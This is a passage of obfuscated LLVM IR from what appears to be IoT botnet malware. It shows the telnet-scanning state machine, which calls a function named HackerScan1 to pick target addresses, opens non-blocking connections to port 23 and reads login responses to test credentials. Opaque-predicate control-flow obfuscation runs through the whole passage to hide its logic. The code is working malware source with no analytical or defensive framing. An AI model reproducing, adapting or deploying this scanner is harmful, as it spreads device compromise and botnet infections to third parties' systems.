  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 9
  store i32 %149, i32* %153, align 8
  br label %154

; <label>:154:                                    ; preds = %147, %140
  %155 = load i32, i32* @x.99
  %156 = load i32, i32* @y.100
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %154
  %163 = load i32, i32* %11, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 3
  %167 = load i8, i8* %166, align 4
  %168 = zext i8 %167 to i32
  %169 = load i32, i32* @x.99
  %170 = load i32, i32* @y.100
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  switch i32 %168, label %1267 [
    i32 0, label %177
    i32 1, label %379
    i32 2, label %587
    i32 3, label %671
    i32 4, label %743
    i32 5, label %859
    i32 6, label %947
    i32 7, label %1113
    i32 8, label %1170
  ]

; <label>:177:                                    ; preds = %originalBBpart229
  %178 = load i32, i32* %11, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 4
  %182 = load i8, i8* %181, align 1
  %183 = icmp ne i8 %182, 0
  br i1 %183, label %184, label %204

; <label>:184:                                    ; preds = %177
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 11
  %189 = load i8*, i8** %188, align 8
  store i8* %189, i8** %19, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %191
  %193 = bitcast %struct.telstate_t* %192 to i8*
  call void @llvm.memset.p0i8.i64(i8* %193, i8 0, i64 40, i32 8, i1 false)
  %194 = load i8*, i8** %19, align 8
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 11
  store i8* %194, i8** %198, align 8
  %199 = call i32 @HackerScan1()
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 2
  store i32 %199, i32* %203, align 8
  br label %259

; <label>:204:                                    ; preds = %177
  %205 = load i32, i32* @x.99
  %206 = load i32, i32* @y.100
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %204
  %213 = load i32, i32* %11, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 6
  %217 = load i8, i8* %216, align 1
  %218 = add i8 %217, 1
  store i8 %218, i8* %216, align 1
  %219 = load i32, i32* %11, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 5
  %223 = load i8, i8* %222, align 2
  %224 = add i8 %223, 1
  store i8 %224, i8* %222, align 2
  %225 = load i32, i32* %11, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 6
  %229 = load i8, i8* %228, align 1
  %230 = zext i8 %229 to i64
  %231 = icmp eq i64 %230, 7
  %232 = load i32, i32* @x.99
  %233 = load i32, i32* @y.100
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart251, label %originalBB31alteredBB

originalBBpart251:                                ; preds = %originalBB31
  br i1 %231, label %240, label %245

; <label>:240:                                    ; preds = %originalBBpart251
  %241 = load i32, i32* %11, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 4
  store i8 1, i8* %244, align 1
  br label %1284

; <label>:245:                                    ; preds = %originalBBpart251
  %246 = load i32, i32* %11, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %247
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %248, i32 0, i32 5
  %250 = load i8, i8* %249, align 2
  %251 = zext i8 %250 to i64
  %252 = icmp eq i64 %251, 7
  br i1 %252, label %253, label %258

; <label>:253:                                    ; preds = %245
  %254 = load i32, i32* %11, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %255
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %256, i32 0, i32 4
  store i8 1, i8* %257, align 1
  br label %1284

; <label>:258:                                    ; preds = %245
  br label %259

; <label>:259:                                    ; preds = %258, %184
  %260 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %260, align 4
  %261 = call zeroext i16 @htons(i16 zeroext 23) #10
  %262 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %261, i16* %262, align 2
  %263 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %264 = getelementptr inbounds [8 x i8], [8 x i8]* %263, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %264, i8 0, i64 8, i32 4, i1 false)
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 2
  %269 = load i32, i32* %268, align 8
  %270 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %271 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %270, i32 0, i32 0
  store i32 %269, i32* %271, align 4
  %272 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %273 = load i32, i32* %11, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 0
  store i32 %272, i32* %276, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %278
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 8
  %282 = icmp eq i32 %281, -1
  br i1 %282, label %283, label %284

; <label>:283:                                    ; preds = %259
  br label %1284

; <label>:284:                                    ; preds = %259
  %285 = load i32, i32* @x.99
  %286 = load i32, i32* @y.100
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %284
  %293 = load i32, i32* %11, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %294
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 8
  %298 = load i32, i32* %11, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 8
  %303 = call i32 (i32, i32, ...) @fcntl(i32 %302, i32 3, i8* null)
  %304 = or i32 %303, 2048
  %305 = call i32 (i32, i32, ...) @fcntl(i32 %297, i32 4, i32 %304)
  %306 = load i32, i32* %11, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 8
  %311 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %312 = call i32 @connect(i32 %310, %struct.sockaddr* %311, i32 16)
  %313 = icmp eq i32 %312, -1
  %314 = load i32, i32* @x.99
  %315 = load i32, i32* @y.100
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart266, label %originalBB53alteredBB

originalBBpart266:                                ; preds = %originalBB53
  br i1 %313, label %322, label %337

; <label>:322:                                    ; preds = %originalBBpart266
  %323 = call i32* @__errno_location() #10
  %324 = load i32, i32* %323, align 4
  %325 = icmp ne i32 %324, 115
  br i1 %325, label %326, label %337

; <label>:326:                                    ; preds = %322
  %327 = load i32, i32* %11, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 8
  %332 = call i32 @sclose(i32 %331)
  %333 = load i32, i32* %11, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 4
  store i8 1, i8* %336, align 1
  br label %362

; <label>:337:                                    ; preds = %322, %originalBBpart266
  %338 = load i32, i32* @x.99
  %339 = load i32, i32* @y.100
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %337
  %346 = load i32, i32* %11, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 3
  store i8 1, i8* %349, align 4
  %350 = load i32, i32* %11, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 9
  store i32 0, i32* %353, align 8
  %354 = load i32, i32* @x.99
  %355 = load i32, i32* @y.100
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %362

; <label>:362:                                    ; preds = %originalBBpart270, %326
  %363 = load i32, i32* @x.99
  %364 = load i32, i32* @y.100
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %362
  %371 = load i32, i32* @x.99
  %372 = load i32, i32* @y.100
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %1267

; <label>:379:                                    ; preds = %originalBBpart229
  %380 = load i32, i32* @x.99
  %381 = load i32, i32* @y.100
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %379
  %388 = load i32, i32* @x.99
  %389 = load i32, i32* @y.100
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %396

; <label>:396:                                    ; preds = %originalBBpart278
  %397 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %398 = getelementptr inbounds [16 x i64], [16 x i64]* %397, i64 0, i64 0
  %399 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %398) #5, !srcloc !10
  %400 = extractvalue { i64, i64* } %399, 0
  %401 = extractvalue { i64, i64* } %399, 1
  %402 = trunc i64 %400 to i32
  store i32 %402, i32* %20, align 4
  %403 = ptrtoint i64* %401 to i64
  %404 = trunc i64 %403 to i32
  store i32 %404, i32* %21, align 4
  br label %405

; <label>:405:                                    ; preds = %396
  br label %406

; <label>:406:                                    ; preds = %405
  %407 = load i32, i32* @x.99
  %408 = load i32, i32* @y.100
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %406
  %415 = load i32, i32* %11, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 0
  %419 = load i32, i32* %418, align 8
  %420 = srem i32 %419, 64
  %421 = zext i32 %420 to i64
  %422 = shl i64 1, %421
  %423 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %424 = load i32, i32* %11, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 8
  %429 = sdiv i32 %428, 64
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds [16 x i64], [16 x i64]* %423, i64 0, i64 %430
  %432 = load i64, i64* %431, align 8
  %433 = or i64 %432, %422
  store i64 %433, i64* %431, align 8
  %434 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 0
  store i64 0, i64* %434, align 8
  %435 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 1
  store i64 10000, i64* %435, align 8
  %436 = load i32, i32* %11, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 8
  %441 = add nsw i32 %440, 1
  %442 = call i32 @select(i32 %441, %struct.fd_set* null, %struct.fd_set* %14, %struct.fd_set* null, %struct.timeval* %15)
  store i32 %442, i32* %12, align 4
  %443 = load i32, i32* %12, align 4
  %444 = icmp eq i32 %443, 1
  %445 = load i32, i32* @x.99
  %446 = load i32, i32* @y.100
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBBpart2134, label %originalBB80alteredBB

originalBBpart2134:                               ; preds = %originalBB80
  br i1 %444, label %453, label %526

; <label>:453:                                    ; preds = %originalBBpart2134
  %454 = load i32, i32* @x.99
  %455 = load i32, i32* @y.100
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %453
  store i32 4, i32* %16, align 4
  store i32 0, i32* %13, align 4
  %462 = load i32, i32* %11, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 0
  %466 = load i32, i32* %465, align 8
  %467 = bitcast i32* %13 to i8*
  %468 = call i32 @getsockopt(i32 %466, i32 1, i32 4, i8* %467, i32* %16) #5
  %469 = load i32, i32* %13, align 4
  %470 = icmp ne i32 %469, 0
  %471 = load i32, i32* @x.99
  %472 = load i32, i32* @y.100
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %470, label %479, label %494

; <label>:479:                                    ; preds = %originalBBpart2138
  %480 = load i32, i32* %11, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 0
  %484 = load i32, i32* %483, align 8
  %485 = call i32 @sclose(i32 %484)
  %486 = load i32, i32* %11, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 3
  store i8 0, i8* %489, align 4
  %490 = load i32, i32* %11, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 4
  store i8 1, i8* %493, align 1
  br label %525

; <label>:494:                                    ; preds = %originalBBpart2138
  %495 = load i32, i32* %11, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %496
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %497, i32 0, i32 0
  %499 = load i32, i32* %498, align 8
  %500 = load i32, i32* %11, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 0
  %504 = load i32, i32* %503, align 8
  %505 = call i32 (i32, i32, ...) @fcntl(i32 %504, i32 3, i8* null)
  %506 = and i32 %505, -2049
  %507 = call i32 (i32, i32, ...) @fcntl(i32 %499, i32 4, i32 %506)
  %508 = load i32, i32* %11, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 9
  store i32 0, i32* %511, align 8
  %512 = load i32, i32* %11, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 10
  store i16 0, i16* %515, align 4
  %516 = load i32, i32* %11, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 11
  %520 = load i8*, i8** %519, align 8
  call void @llvm.memset.p0i8.i64(i8* %520, i8 0, i64 256, i32 1, i1 false)
  %521 = load i32, i32* %11, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 3
  store i8 2, i8* %524, align 4
  br label %525

; <label>:525:                                    ; preds = %494, %479
  br label %1284

; <label>:526:                                    ; preds = %originalBBpart2134
  %527 = load i32, i32* %12, align 4
  %528 = icmp eq i32 %527, -1
  br i1 %528, label %529, label %544

; <label>:529:                                    ; preds = %526
  %530 = load i32, i32* %11, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 0
  %534 = load i32, i32* %533, align 8
  %535 = call i32 @sclose(i32 %534)
  %536 = load i32, i32* %11, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 3
  store i8 0, i8* %539, align 4
  %540 = load i32, i32* %11, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 4
  store i8 1, i8* %543, align 1
  br label %1284

; <label>:544:                                    ; preds = %526
  br label %545

; <label>:545:                                    ; preds = %544
  %546 = load i32, i32* %11, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 9
  %550 = load i32, i32* %549, align 8
  %551 = add i32 %550, 6
  %552 = zext i32 %551 to i64
  %553 = call i64 @time(i64* null) #5
  %554 = icmp slt i64 %552, %553
  br i1 %554, label %555, label %586

; <label>:555:                                    ; preds = %545
  %556 = load i32, i32* @x.99
  %557 = load i32, i32* @y.100
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %555
  %564 = load i32, i32* %11, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 0
  %568 = load i32, i32* %567, align 8
  %569 = call i32 @sclose(i32 %568)
  %570 = load i32, i32* %11, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 3
  store i8 0, i8* %573, align 4
  %574 = load i32, i32* %11, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 4
  store i8 1, i8* %577, align 1
  %578 = load i32, i32* @x.99
  %579 = load i32, i32* @y.100
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %586

; <label>:586:                                    ; preds = %originalBBpart2142, %545
  br label %1267

; <label>:587:                                    ; preds = %originalBBpart229
  %588 = load i32, i32* %11, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 0
  %592 = load i32, i32* %591, align 8
  %593 = load i32, i32* %11, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 11
  %597 = load i8*, i8** %596, align 8
  %598 = call i32 @read_until_response(i32 %592, i32 10000, i8* %597, i32 256, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %599 = icmp ne i32 %598, 0
  br i1 %599, label %600, label %635

; <label>:600:                                    ; preds = %587
  %601 = load i32, i32* @x.99
  %602 = load i32, i32* @y.100
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %600
  %609 = load i32, i32* %11, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 11
  %613 = load i8*, i8** %612, align 8
  %614 = call i32 @contains_fail(i8* %613)
  %615 = icmp ne i32 %614, 0
  %616 = load i32, i32* @x.99
  %617 = load i32, i32* @y.100
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br i1 %615, label %624, label %629

; <label>:624:                                    ; preds = %originalBBpart2146
  %625 = load i32, i32* %11, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 3
  store i8 0, i8* %628, align 4
  br label %634

; <label>:629:                                    ; preds = %originalBBpart2146
  %630 = load i32, i32* %11, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 3
  store i8 3, i8* %633, align 4
  br label %634

; <label>:634:                                    ; preds = %629, %624
  br label %1284

; <label>:635:                                    ; preds = %587
  %636 = load i32, i32* %11, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 9
  %640 = load i32, i32* %639, align 8
  %641 = add i32 %640, 6
  %642 = zext i32 %641 to i64
  %643 = call i64 @time(i64* null) #5
  %644 = icmp slt i64 %642, %643
  br i1 %644, label %645, label %654

; <label>:645:                                    ; preds = %635
  %646 = load i32, i32* %11, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 3
  store i8 0, i8* %649, align 4
  %650 = load i32, i32* %11, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 4
  store i8 1, i8* %653, align 1
  br label %654

; <label>:654:                                    ; preds = %645, %635
  %655 = load i32, i32* @x.99
  %656 = load i32, i32* @y.100
  %657 = sub i32 %655, 1
  %658 = mul i32 %655, %657
  %659 = urem i32 %658, 2
  %660 = icmp eq i32 %659, 0
  %661 = icmp slt i32 %656, 10
  %662 = or i1 %660, %661
